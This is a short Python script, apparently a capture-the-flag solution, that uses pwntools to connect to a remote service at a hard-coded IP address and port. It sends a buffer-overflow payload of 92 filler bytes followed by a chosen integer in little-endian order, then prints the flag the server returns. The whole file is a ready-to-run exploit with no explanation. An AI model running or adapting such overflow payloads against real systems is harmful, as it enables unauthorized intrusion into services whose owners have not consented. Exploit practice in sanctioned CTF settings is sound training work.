from pwn import *
from Crypto.Util.number import *
r = remote('14.225.255.180',1920)

# context.log_level = 'DEBUG'
welcome_message = r.recvuntil("Give me a number you like:")

payload = b'A'*92 + long_to_bytes(1307711726)[::-1]
r.sendline(payload)
flag = r.recvall()
print(flag.decode('utf8'))
r.close()